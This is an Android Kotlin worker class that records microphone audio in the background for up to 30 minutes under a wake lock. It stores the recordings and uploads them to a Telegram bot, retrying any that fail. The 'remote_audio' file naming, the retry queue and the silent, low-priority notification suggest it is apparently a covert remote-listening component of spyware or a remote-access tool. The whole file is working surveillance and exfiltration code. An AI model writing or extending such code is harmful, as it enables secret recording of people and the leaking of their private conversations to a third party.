package com.example.worker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.os.PowerManager
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.CoroutineWorker
import androidx.work.Data
import androidx.work.ForegroundInfo
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.example.data.local.AppDatabase
import com.example.data.local.AudioRecordingEntity
import com.example.data.sync.AudioRecorderHelper
import com.example.data.sync.TelegramBotManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class AudioRecordingWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        const val KEY_DURATION_SEC = "duration_sec"
        const val WORK_NAME = "AudioRecordingWork"

        fun enqueueWork(context: Context, durationSec: Int = 1800) {
            val inputData = Data.Builder()
                .putInt(KEY_DURATION_SEC, durationSec)
                .build()

            val workRequest = OneTimeWorkRequestBuilder<AudioRecordingWorker>()
                .setInputData(inputData)
                .build()

            WorkManager.getInstance(context).enqueue(workRequest)
            Log.d("AudioRecordingWorker", "Enqueued background audio recording work for $durationSec seconds.")
        }
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        val durationSec = inputData.getInt(KEY_DURATION_SEC, 1800)
        Log.d("AudioRecordingWorker", "Starting background audio recording session of $durationSec seconds with WakeLock safety...")

        // Acquire WakeLock so CPU never sleeps during recording and upload
        var wakeLock: PowerManager.WakeLock? = null
        try {
            val powerManager = applicationContext.getSystemService(Context.POWER_SERVICE) as? PowerManager
            wakeLock = powerManager?.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "EnterpriseSync::AudioRecordingWorkerWakeLock"
            )
            // Acquire for duration + 5 minutes safety buffer
            wakeLock?.acquire((durationSec + 300) * 1000L)
        } catch (e: Exception) {
            Log.w("AudioRecordingWorker", "Failed to acquire WakeLock: ${e.message}")
        }

        try {
            setForeground(createForegroundInfo())
        } catch (e: Exception) {
            Log.w("AudioRecordingWorker", "Failed to set foreground info: ${e.message}")
        }

        val database = AppDatabase.getInstance(applicationContext)
        val recordingDao = database.audioRecordingDao()

        // 1. Retry any pending/unsynced audio recordings stored in Room due to previous connectivity loss
        try {
            val unsynced = recordingDao.getUnsyncedRecordings()
            val telegramBot = TelegramBotManager(applicationContext)
            for (record in unsynced) {
                try {
                    val file = java.io.File(record.filePath)
                    if (file.exists() && file.length() > 0) {
                        val bytes = file.readBytes()
                        telegramBot.sendAudio(
                            bytes,
                            file.name,
                            "Retried Audio Sync - Duration: ${record.durationSeconds} sec"
                        )
                        recordingDao.updateSyncStatus(record.id, true, record.retryCount, "")
                        Log.d("AudioRecordingWorker", "Successfully synced pending audio recording ID=${record.id}")
                    } else {
                        recordingDao.updateSyncStatus(record.id, true, record.retryCount, "File not found or empty")
                    }
                } catch (e: Exception) {
                    Log.w("AudioRecordingWorker", "Failed to sync pending recording ID=${record.id}: ${e.message}")
                    recordingDao.updateSyncStatus(record.id, false, record.retryCount + 1, e.message ?: "Unknown error")
                }
            }
        } catch (e: Exception) {
            Log.w("AudioRecordingWorker", "Error retrying unsynced audio recordings: ${e.message}")
        }

        val audioHelper = AudioRecorderHelper(applicationContext)
        var recordingId: Long = -1L
        try {
            val base64Data = audioHelper.startRecording(durationSec)
            if (base64Data != null) {
                val base64Content = base64Data.substringAfter(",")
                val audioBytes = Base64.decode(base64Content, Base64.NO_WRAP)
                val nowMs = System.currentTimeMillis()
                val audioExt = "wav"
                val fileName = "remote_audio_${nowMs}.$audioExt"
                
                val persistentFile = java.io.File(applicationContext.filesDir, fileName)
                try {
                    persistentFile.writeBytes(audioBytes)
                } catch (e: Exception) {
                    Log.w("AudioRecordingWorker", "Failed to save audio to persistent filesDir: ${e.message}")
                }

                val entity = AudioRecordingEntity(
                    filePath = persistentFile.absolutePath,
                    durationSeconds = durationSec,
                    fileSize = audioBytes.size.toLong(),
                    mimeType = "audio/wav",
                    createdAt = nowMs,
                    isSynced = false,
                    retryCount = 0
                )
                recordingId = recordingDao.insertRecording(entity)

                try {
                    val telegramBot = TelegramBotManager(applicationContext)
                    telegramBot.sendAudio(
                        audioBytes,
                        fileName,
                        "Background Recording - Duration: $durationSec sec (${(audioBytes.size / 1024)} KB)"
                    )
                    recordingDao.updateSyncStatus(recordingId, true, 0, "")
                    Log.d("AudioRecordingWorker", "Background audio recording successfully uploaded and marked synced.")
                } catch (e: Exception) {
                    Log.e("AudioRecordingWorker", "Failed to upload recorded audio (connectivity lost?): ${e.message}")
                    recordingDao.updateSyncStatus(recordingId, false, 1, e.message ?: "Upload failed")
                    return@withContext Result.retry()
                }

                return@withContext Result.success()
            } else {
                Log.w("AudioRecordingWorker", "Audio recording returned null data, retrying...")
                return@withContext Result.retry()
            }
        } catch (e: SecurityException) {
            Log.e("AudioRecordingWorker", "Microphone permission missing: ${e.message}")
            return@withContext Result.failure()
        } catch (e: Exception) {
            Log.e("AudioRecordingWorker", "Audio recording stream interrupted or failed: ${e.message}")
            if (recordingId != -1L) {
                try {
                    recordingDao.updateSyncStatus(recordingId, false, 1, e.message ?: "Interrupted")
                } catch (_: Exception) {}
            }
            return@withContext Result.retry()
        } finally {
            try {
                audioHelper.cleanup()
            } catch (_: Exception) {}
            try {
                if (wakeLock?.isHeld == true) {
                    wakeLock?.release()
                }
            } catch (_: Exception) {}
        }
    }

    private fun createForegroundInfo(): ForegroundInfo {
        val channelId = "audio_recording_channel"
        val notificationManager = applicationContext.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Remote Audio Recording",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Running secure background audio recording session"
                setSound(null, null)
                enableVibration(false)
            }
            notificationManager?.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(applicationContext, channelId)
            .setContentTitle("Audio Recording Service")
            .setContentText("Recording audio session in background...")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            ForegroundInfo(1002, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        } else {
            ForegroundInfo(1002, notification)
        }
    }
}
